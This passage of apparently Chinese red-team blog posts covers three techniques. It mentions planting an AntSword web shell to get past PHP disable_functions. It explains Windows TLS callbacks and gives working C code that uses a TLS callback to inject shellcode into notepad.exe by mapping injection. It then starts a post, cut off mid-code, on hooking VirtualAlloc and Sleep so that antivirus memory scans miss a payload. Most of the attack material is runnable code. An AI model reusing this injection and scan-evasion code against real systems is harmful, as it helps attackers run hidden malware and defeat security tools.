<p>具体原理分析可见 <a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p>
<h5 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h5><p>直接使用蚁剑的插件</p>
<p><img src="/posts/fbcae803/17.png" alt="img"></p>
<p>可以看到在 /var/www/html/目录下创建一个 .antproxy.php 的shell文件  连接后即可执行命令</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.csdn.net/unexpectedthing/article/details/123782308">https://blog.csdn.net/unexpectedthing/article/details/123782308</a></p>
<p><a href="https://xz.aliyun.com/t/10057#toc-7">https://xz.aliyun.com/t/10057#toc-7</a></p>
<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/</a></p>
]]></content>
  </entry>
  <entry>
    <title>TLSCallBack</title>
    <url>/posts/2926e3f0/</url>
    <content><![CDATA[<h4 id="TLS简介"><a href="#TLS简介" class="headerlink" title="TLS简介"></a>TLS简介</h4><p><strong>TLS</strong> (Thread Local Storage 线程局部存储)，是给定多线程进程中的每个线程可以分配存储线程特定数据的位置的方法。使用TLS技术可以在线程内部独立使用或修改进程的全局数据或静态数据， 就像对待自身的局部变量一样。( 用来将数据与一个正在执行的指定线程关联起来。)</p>
<p><strong>TLS回调函数的调用要先于入口点(EP，entry point)代码的执行，而调试器通常默认在主函数入口点Main设置断点</strong>，因此常常被用作反调试手段使用。</p>
<p>如果开启TLS功能，PE文件头就会设置TLS表,在<code>IMAGE_NT_HEADERS-IMAGE_DATA_DIRECTORY-DataDirectry[9]</code>描述了 <code>IAMGE_TLS_DIRECTORY</code>结构体的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span> &#123;</span>   <span class="comment">//SIZE:0x18h</span></span><br><span class="line">    DWORD   StartAddressOfRawData;		<span class="comment">// TLS模版在内存中起始的VA</span></span><br><span class="line">    DWORD   EndAddressOfRawData;		<span class="comment">// TLS模版在内存中结束的VA</span></span><br><span class="line">    DWORD   AddressOfIndex;             <span class="comment">// TLS索引的位置	// PDWORD   </span></span><br><span class="line">    DWORD   AddressOfCallBacks;         <span class="comment">//执行TLS注册的回调函数的函数指针(地址)数组 // PIMAGE_TLS_CALLBACK *  </span></span><br><span class="line">    DWORD   SizeOfZeroFill;				<span class="comment">// 用于指定非零初始化数据后面的空白空间的大小</span></span><br><span class="line">    DWORD   Characteristics;			<span class="comment">// 属性</span></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2926e3f0/1.png" alt="img"></p>
<h4 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h4><p>TLS回调函数属于一种特殊的回调函数 其会在进程加载前、进程加载后、线程加载前、线程加载后执行。函数定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span> <span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">( </span></span><br><span class="line"><span class="params">    PVOID DllHandle, 	<span class="comment">// 模块句柄</span></span></span><br><span class="line"><span class="params">	DWORD Reason, 		<span class="comment">// Reason 遵循dll调用时相同的参数</span></span></span><br><span class="line"><span class="params"> 	PVOID Reserved		<span class="comment">// 保留</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>其中Reason取值为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 1    <span class="comment">//进程/主线程启动</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_ATTACH  2    <span class="comment">//子线程启动</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_DETACH  3    <span class="comment">//子线程关闭</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 0    <span class="comment">//主线程关闭</span></span></span><br></pre></td></tr></table></figure>

<h4 id="TLS使用"><a href="#TLS使用" class="headerlink" title="TLS使用"></a>TLS使用</h4><p>在VS中 可以直接使用编译器功能 设置TLS回调</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)				<span class="comment">// 指明使用TLS回调</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>) 	</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>首先在编译器中声明TLS回调 </p>
<p>注:x64下 <code>_tls_used</code> ,x86下 <code>__tls_used</code> x86下前面多一个<code>_</code>；<code>_tls_callback</code> 同理。</p>
<p><code>_tls_used</code> 声明使用TLS回调 将在PE中创建一个 <code>.tls</code>的节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tls import</span></span><br><span class="line">PIMAGE_TLS_CALLBACK thread_callback_base[] = &#123; tls_callback_1, tls_callback_2, <span class="number">0</span> &#125;;        <span class="comment">// 设置TLS回调</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()	<span class="comment">//共享数据区</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_WIN64</span></span></span><br></pre></td></tr></table></figure>

<p>随后设置TLS回调 节名 <code>.CRT$XB</code> 含义如下：</p>
<ul>
<li><code>CRT</code> 表示使用C Runtime机制</li>
<li><code>$X</code> 表示随机标识</li>
<li><code>L</code> 表示TLS CallBack Section</li>
<li>最后的 <code>B</code> 可以替换为 <code>B~Y</code> 之间的任意一个字符</li>
</ul>
<h4 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>;</span><br><span class="line"><span class="comment">//linker spec</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)				<span class="comment">// 指明使用TLS回调</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>) 	<span class="comment">// 强制编译器生成对thread_callback_base的引用，防止优化</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//end linker</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tls import</span></span><br><span class="line">PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_WIN64</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//end </span></span><br><span class="line"><span class="comment">// tls declaration</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, (LPCSTR)<span class="string">&quot;TLS Callback before main :)&quot;</span>, (LPCSTR)<span class="string">&quot;TLS Callback&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// end declaration</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Main function but  never be executed :(&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2926e3f0/2.png" alt="img"></p>
<h4 id="TLS拓展"><a href="#TLS拓展" class="headerlink" title="TLS拓展"></a>TLS拓展</h4><p>由于TLS调用时 通常已经初始化了所有进程相关信息(DLL加载、PEB分配)，所以理论上可以再TLS CallBack 函数中实现任意代码，可以通过TLS实现其他技术，如在TLS回调函数中实现Mapping Injection</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>;</span><br><span class="line">DWORD <span class="title function_">FindProcessID</span><span class="params">(LPCTSTR ProcessName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)				<span class="comment">// 指明使用TLS回调</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>) 	</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tls import</span></span><br><span class="line">PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_WIN64</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> CalcShellcode[] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xe7</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x20</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x1b</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x1b</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd8</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x3c</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x31</span>,</span><br><span class="line">	<span class="number">0xc9</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0xc1</span>, <span class="number">0xff</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xe9</span>, <span class="number">0x08</span>, <span class="number">0x8b</span>, <span class="number">0x14</span>, <span class="number">0x0b</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x44</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x1c</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xc2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xdb</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x5a</span>, <span class="number">0x20</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xe4</span>, <span class="number">0x44</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x62</span>, <span class="number">0x24</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xc4</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x5b</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>,</span><br><span class="line">	<span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xd6</span>, <span class="number">0xf3</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xc0</span>, <span class="number">0xeb</span>, <span class="number">0xe6</span>, <span class="number">0x59</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x44</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x82</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc0</span>, <span class="number">0x53</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x31</span>,</span><br><span class="line">	<span class="number">0xc9</span>, <span class="number">0x80</span>, <span class="number">0xc1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x0f</span>, <span class="number">0xa8</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0xba</span>, <span class="number">0x87</span>, <span class="number">0x9a</span>, <span class="number">0x9c</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xe8</span>,</span><br><span class="line">	<span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0xe8</span>, <span class="number">0xb0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xe1</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>,</span><br><span class="line">	<span class="number">0x9c</span>, <span class="number">0x9e</span>, <span class="number">0x93</span>, <span class="number">0x9c</span>, <span class="number">0xd1</span>, <span class="number">0x9a</span>, <span class="number">0x87</span>, <span class="number">0x9a</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe1</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>,</span><br><span class="line">	<span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xff</span>, <span class="number">0xd6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD PID;</span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">		PROCESSENTRY32 pe;</span><br><span class="line">		pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> PID = FindProcessID(<span class="string">L&quot;notepad.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">		HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="keyword">sizeof</span>(CalcShellcode), <span class="literal">NULL</span>);</span><br><span class="line">		LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(CalcShellcode));</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>((PVOID)lpMapAddress, CalcShellcode, <span class="keyword">sizeof</span>(CalcShellcode));</span><br><span class="line"></span><br><span class="line">		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line">		<span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error:%d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_EXECUTE_READ);</span><br><span class="line">		<span class="keyword">if</span> (!lpMapAddressRemote) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;MapViewOfFile2 Error:%d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!hRemoteThread) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot; CreateRemoteThread Error:%d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		UnmapViewOfFile(lpMapAddress);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, (LPCSTR)<span class="string">&quot;TLS Callback before main :)&quot;</span>, (LPCSTR)<span class="string">&quot;TLS Callback&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">FindProcessID</span><span class="params">(LPCTSTR ProcessName)</span> &#123;</span><br><span class="line">	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	process.dwSize = <span class="keyword">sizeof</span>(process);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Process32First(snapshot, &amp;process)) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (!wcscmp(process.szExeFile, (<span class="type">const</span> <span class="type">wchar_t</span>*)ProcessName))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span> (Process32Next(snapshot, &amp;process));</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(snapshot);</span><br><span class="line">	<span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Main function but  never be executed :(&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用Unicode字符集 不然找不到PID..</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute">https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute</a></p>
<p><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/thread-local-storage">https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/thread-local-storage</a></p>
<p><a href="https://medium.com/@aragornSec/thread-local-storage-197f9a3f4fe3">https://medium.com/@aragornSec/thread-local-storage-197f9a3f4fe3</a></p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-local-storage">https://learn.microsoft.com/en-us/windows/win32/procthread/thread-local-storage</a></p>
<p>[<a href="https://lzeroyuee.cn/old-blog/TLS%E5%9B%9E%E8%B0%83%20-%20lZeroyuee&#39;s%20Blog.html]">https://lzeroyuee.cn/old-blog/TLS%E5%9B%9E%E8%B0%83%20-%20lZeroyuee&#39;s%20Blog.html]</a>(<a href="https://lzeroyuee.cn/old-blog/TLS%E5%9B%9E%E8%B0%83">https://lzeroyuee.cn/old-blog/TLS回调</a> - lZeroyuee’s Blog.html)</p>
<p><a href="https://bbs.kanxue.com/thread-267175.htm#msg_header_h1_4">https://bbs.kanxue.com/thread-267175.htm#msg_header_h1_4</a></p>
]]></content>
      <categories>
        <category>TLS</category>
      </categories>
      <tags>
        <tag>TLS</tag>
      </tags>
  </entry>
  <entry>
    <title>VEH异常处理规避内存扫描</title>
    <url>/posts/18c2f5df/</url>
    <content><![CDATA[<h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><p>AV在扫描进程空间时，并不会扫描所有的内存空间，只会扫描敏感的内存区域「可执行区域」。</p>
<p>思路就是不断改变某一块内存属性，当应执行命令或某些操作时，执行的内存属性为可执行，当功能模块进入睡眠状态，则内存属性改为不可执行。当执行的地址空间为不可执行时，如果强制执行就会返回0xc0000005异常。随后通过VEH去捕获该异常，即根据需求动态的改变内存属性，从而规避内存扫描。</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>首先 Hook VirtualAlloc 和 Sleep函数</p>
<h5 id="Hook-VirtualAlloc"><a href="#Hook-VirtualAlloc" class="headerlink" title="Hook VirtualAlloc"></a>Hook VirtualAlloc</h5><p>读取起始地址和内存大小  便于后续修改内存属性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR g_OldSleepData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">LPVOID OldVirtualAlloc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">LPVOID WINAPI <span class="title function_">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> &#123;</span><br><span class="line">	unHookVirtualAlloc();</span><br><span class="line">	BASE_ADDRESS = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	g_dwSize = dwSize;</span><br><span class="line">	HookVirtualAlloc();</span><br><span class="line">	<span class="keyword">return</span> BASE_ADDRESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwAllocOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pAllocData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line">	<span class="comment">//保存原来的硬编码</span></span><br><span class="line">	RtlCopyMemory(g_OldAllocData, OldVirtualAlloc, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//计算偏移</span></span><br><span class="line">	DWORD dwAllocOffeset = (DWORD)NewVirtualAlloc - (DWORD)OldVirtualAlloc - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//得到完整的pAllocData</span></span><br><span class="line">	RtlCopyMemory(&amp;pAllocData[<span class="number">1</span>], &amp;dwAllocOffeset, <span class="keyword">sizeof</span>(dwAllocOffeset));</span><br><span class="line">	<span class="comment">//改为可写属性</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwAllocOldProtect);</span><br><span class="line">	<span 